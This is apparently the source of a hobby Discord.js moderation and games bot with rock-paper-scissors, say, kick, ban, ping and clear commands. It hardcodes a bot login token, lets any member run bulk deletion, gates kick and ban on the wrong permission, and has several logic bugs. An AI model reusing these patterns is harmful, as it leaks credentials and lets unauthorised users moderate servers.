//Libraries (Discord.js)
const Discord = require("discord.js");
const client = new Discord.Client();


//On join new server
client.on("guildCreate", guild => {
    const channel = guild.channels.find(c => c.name === "general");
    let joinEmbed = new Discord.RichEmbed()
    .setTitle("Invitation")
    .setColor("#5fffcb")
    .setDescription("Thank you for inviting me upon your guild, **" + guild.name + "**. I am glad to join your server and will make it a better place. If you ever experience errors or difficulties with me, don't hesitate and join the Support Server. Also, if you need help finding some commands, please use the command `/help`.\n**Cheers**! 🍷");

    guild.createRole({
      NAME: "Tingle",
      COLOR: "BLUE",
      PERMISSION: "ADMINISTRATOR",
    });


    if(!channel) return guild.members.get(guild.ownerID).send(joinEmbed);
    channel.send(joinEmbed);
});

//Start-up message | Activity
client.on("ready", () => {
  //Start-up message
  console.log("Tingle has loaded - 100%");

  //Activity (Status, Presence)
  setInterval(function() {
    //If bot is in 1 server, change guilds to guild
    if(client.guilds.size == 1){
      client.user.setActivity("to /help in " + client.guilds.size + " guild. | Tingle", { type: "LISTENING" });
    }

    //If bot is in +2 server, change guild to guilds
    if(client.guilds.size > 2){
      client.user.setActivity("/help in " + client.guilds.size + " guilds. | Tingle", { type: "LISTENING" });
    }

  }, 5000);
});

//Basic setup
client.on("message", message => {


  //Custom Emojis (ErrorMark, CheckMark)
  const ErrorMark = client.emojis.get("478107195020673027");
  const CheckMark = client.emojis.get("478106894196539402");

  //Bot setup (Prefix, Commands, Arguements, Sender)
  const prefix = "/";
  const args = message.content.split(/ +/g);
  const cmd = args.shift().toLowerCase();
  const sender = message.author;

  //If sender = A bot user, return.
  if(sender.bot) return;

  //If message.channel.type == "dm" and command used: return with text.
  if(message.channel.type == "dm"){
    if(cmd == prefix + "say"){
      message.channel.send("You may only use the say command in a guild, " + sender + ".");
      return;
    }
    if(cmd == prefix + "kick"){
      message.channel.send("You may only use the kick command in a guild, " + sender + ".");
      return;
    }
    if(cmd == prefix + "ban"){
      message.channel.send("You may only use the ban command in a guild, " + sender + ".");
      return;
    }
    if(cmd == prefix + "ping"){
      message.channel.send("You may only use the ping command in a guild, " + sender + ".");
      return;
    }
  };

  //Commands - Format:
  //if(cmd == prefix + "NAME"){
  //message.channel.send("Text!");
  //}

  //If message is Tingle news channel - React with CheckMark emoji.
  if(message.channel.id == "476060156094840832"){
    if(message.content.includes("@everyone")){
      message.react(CheckMark);
      }
  }

  //RPS Commands - /rps
  if(cmd == prefix + "rps"){
    message.react("🗿");
    message.react("📜");
    message.react("✂");

    let rpsEmbedS = new Discord.RichEmbed()
    .setTitle("Rock, Paper, Scissors!")
    .setColor("#5fffcb")
    .setDescription(sender + ", lets play some Rock, Paper, Scissors! To start, react on any of the reactions on your message. Rock ( :moyai: ) **|** Paper ( :scroll: ) **|** Scissors ( :scissors: )");

    message.channel.send(rpsEmbedS).then((msg => {
      //Rock start
      const rfilter = (reaction, user) => reaction.emoji.name === '🗿' && user.id === message.author.id;
      const rcollector = message.createReactionCollector(rfilter, { time: 15000 });
      const pfilter = (reaction, user) => reaction.emoji.name === '📜' && user.id === message.author.id;
      const pcollector = message.createReactionCollector(pfilter, { time: 15000 });
      const sfilter = (reaction, user) => reaction.emoji.name === '✂' && user.id === message.author.id;
      const scollector = message.createReactionCollector(sfilter, { time: 15000 });

      rcollector.on('collect', r => {
        message.channel.send(r.emoji.name)
        let botChoose = ["Rock ( :moyai: )\n\n\nWe tied!", "Paper ( :scroll: )\n\n\nI won!", "Scissors ( :scissors: )\n\n\nYou won!"];
        let random = Math.floor((Math.random() * botChoose.length));

        let rockEmbed = new Discord.RichEmbed()
        .setTitle("Rock, Paper, Scissors!")
        .setColor("#5fffcb")
        .addField("You chose", "Rock ( :moyai: )")
        .addField("I chose", botChoose[random]);

        if(r.emoji.name == "📜") return;

        return msg.edit(rockEmbed);
      });
      rcollector.on('end', collected => {
        pcollector.on("collected", r => {
          if(r.emoji.name == ":scroll:") return;
        });
      if(collected.size == 0) return message.channel.send(ErrorMark + " | " + sender + ", you did not react before 15 seconds. To retry, please use the command `/rps`.");

      });
      //Rock end

      //Paper start

      pcollector.on('collect', r => {
        let botChoose = ["Rock ( :moyai: )\n\n\nYou won!", "Paper ( :scroll: )\n\n\nWe tied.", "Scissors ( :scissors: )\n\n\nI won!"];
        let random = Math.floor((Math.random() * botChoose.length));

        let paperEmbed = new Discord.RichEmbed()
        .setTitle("Rock, Paper, Scissors!")
        .setColor("#5fffcb")
        .addField("You chose", "Paper ( :scroll: )")
        .addField("I chose", botChoose[random]);

        return msg.edit(paperEmbed);
      });
      pcollector.on('end', collected => {
      if(collected.size == 0) return message.channel.send(ErrorMark + " | " + sender + ", you did not react before 15 seconds. To retry, please use the command `/rps`.");
      });
      //Paper end

      //Rock start

      scollector.on('collect', r => {
        let botChoose = ["Rock ( :moyai: )\n\n\nI won!", "Paper ( :scroll: )\n\n\nI lost!", "Scissors ( :scissors: )\n\n\nWe tied."];
        let random = Math.floor((Math.random() * botChoose.length));

        let rockEmbed = new Discord.RichEmbed()
        .setTitle("Rock, Paper, Scissors!")
        .setColor("#5fffcb")
        .addField("You chose", "Paper")
        .addField("I chose", botChoose[random]);

        return msg.edit(rockEmbed);
      });
      scollector.on('end', collected => {
      if(collected.size == 0) return message.channel.send(ErrorMark + " | " + sender + ", you did not react before 15 seconds. To retry, please use the command `/rps`.");
      });
      //Rock end
    }));
  }


  //Say Command - /say "text"
  if(cmd == prefix + "say"){
    if(!args[0]) return message.channel.send(ErrorMark + " | Please provide some text.");
    message.channel.send(args.join(" "));
  }

  //Kick Command - /kick "user"
  if(cmd == prefix + "kick"){
    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send(ErrorMark + ' | You do not have the permission "Manage Members" on this guild.' + sender + ".");
    if(!args[0]) return message.channel.send(ErrorMark + " | Please provide a user.");
    let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
    if(!user) return message.channel.send(ErrorMark + " | Please provide a valid user.");
    if(user.hasPermission("MANAGE_MESSAGES")) return message.channel.send(ErrorMark + ' | ' + user + ' has the permission "Manage Members" on this guild, ' + sender + ".");

    let kickEmbed = new Discord.RichEmbed()
    .setTitle("Kick")
    .setColor("#ffce30")
    .addField("Kicked user:", user)
    .setThumbnail(user.user.avatarURL);


    message.channel.send(kickEmbed).then((msg => {
      msg.react(CheckMark);
    }));
    user.kick();
  }


    //Ban Command - /ban "user"
    if(cmd == prefix + "ban"){
      if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send(ErrorMark + ' | You do not have the permission "Manage Members" on this guild.' + sender + ".");
      if(!args[0]) return message.channel.send(ErrorMark + " | Please provide a user.");
      let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
      if(!user) return message.channel.send(ErrorMark + " | Please provide a valid user.");
      if(user.hasPermission("MANAGE_MESSAGES")) return message.channel.send(ErrorMark + ' | ' + user + ' has the permission "Manage Members" on this guild, ' + sender + ".");

      let banEmbed = new Discord.RichEmbed()
      .setTitle("Ban")
      .setColor("#ff2828")
      .addField("Banned user:", user)
      .setThumbnail(user.user.avatarURL);


      message.channel.send(banEmbed).then((msg => {
        msg.react(CheckMark)
      }));
      user.ban();
    }

    //Ping Command - /ping
    if(cmd == prefix + "ping"){
      let pingEmbedB = new Discord.RichEmbed()
      .setTitle(":ping_pong: Pong!")
      .setThumbnail("https://i.imgur.com/c1jeRzQ.png")
      .setColor("#5fffcb");

      message.channel.send(pingEmbedB).then((msg => {
        let pingEmbedA = new Discord.RichEmbed()
        .setTitle(":ping_pong: Pong!")
        .setColor("#5fffcb")
        .setThumbnail("https://i.imgur.com/c1jeRzQ.png")
        .setDescription(`:arrow_forward: Latency: ${msg.createdTimestamp - message.createdTimestamp}ms.\n\n:signal_strength: API Latency: ` + Math.round(client.ping) + "ms.");

        msg.edit(pingEmbedA);
      }))

    }

    //Clear Command - /clear "NUMBER"
    if(cmd == prefix + "clear"){
      if(!args[0]) return message.channel.send(ErrorMark + " | Please provide a value of messages to delete.");
      if(isNaN(args[0])) return message.channel.send(ErrorMark + " | Please provide a valid number, " + sender);

      message.channel.bulkDelete(args[0]).catch(error => {
        message.channel.send("Error" + error).then((msg => {
          if(msg.content.includes("equal")){
            msg.delete();
            message.channel.bulkDelete("3");
            message.channel.send(ErrorMark + " | You may only provide a value under or equal to 100.");
          } else if (msg.content.includes("14")) {
            msg.delete();
            message.channel.bulkDelete("3");
          message.channel.send(ErrorMark + " | You may only use the /clear command to delete messages under 14 days.");
          }


        }));
      });

      let clearEmbedA = new Discord.RichEmbed()
      .setTitle("Clear")
      .setDescription("Succesfully deleted " + args[0] + " message out of the channel " + message.channel + ".")
      .setColor("#5fffcb")
      .setThumbnail("https://i.imgur.com/bR6GZnZ.png");

      let clearEmbedB = new Discord.RichEmbed()
      .setTitle("Clear")
      .setDescription("Succesfully deleted " + args[0] + " messages out of the channel " + message.channel + ".")
      .setColor("#5fffcb")
      .setThumbnail("https://i.imgur.com/bR6GZnZ.png");

      if(args[0] == "1"){
        message.channel.send(clearEmbedA).then((msg => {
          msg.react(CheckMark);
        }));
      } else {
      message.channel.send(clearEmbedB).then((msg => {
        msg.react(CheckMark);
      }));
      }

    }

    if(cmd == prefix + "react"){
          const filter = (reaction, user) => reaction.emoji.name === `${CheckMark}` && user.id === user
        message.awaitReactions(filter, { time: 10000 })
          .then(collected => console.log(`Collected ${collected.size} reactions`))
          .catch(console.error);
    }
    //END




});


//Client login
client.login("NDcyNzQ1NTg4OTc5NjYyODQ4.DlLH6A.x-3lqpcieoOvu8pH74BXwRydhgo");
